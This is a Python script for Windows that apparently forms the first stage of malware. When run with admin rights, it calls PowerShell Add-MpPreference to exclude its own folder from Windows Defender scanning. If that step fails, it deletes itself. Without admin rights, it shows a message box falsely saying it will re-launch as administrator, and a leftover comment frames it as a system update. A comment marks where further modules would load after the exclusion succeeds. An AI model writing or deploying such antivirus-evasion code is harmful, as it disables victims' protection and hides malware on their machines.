import ctypes.wintypes
import subprocess
import os
import ctypes

def is_admin():
    """ check for privilege """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def add_exclusion():
    """ 
    add current directory to exclusion list 
    return true if success
    """
    exclusion_path = os.path.dirname(os.path.abspath(__file__))
    ps_cmd = f"powershell.exe Add-MpPreference -ExclusionPath '{exclusion_path}'"

    try:
        result = subprocess.run(ps_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return True
        else:
            return False
    except Exception as e:
        pass

def self_destruct():
    """ destroy self """
    try:
        current_pwd = os.path.realpath(__file__)
        os.remove(current_pwd)
    except:
        pass

def display_message(message, title="Notification", box_type="info"):
    """ display info box """
    if box_type == "info":
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)

if __name__ == "__main__":
    if not is_admin():
        # print("This requires administrative privileges. Please run as administrator to update your system.")
        display_message("This script requires administrative privileges.\nAttempting to re-launch as administrator...", "Admin Privileges Required", "info")
    else:
        # if add exclusion true then load other modules, else destroy self
        if add_exclusion():
            pass
        else:
            self_destruct()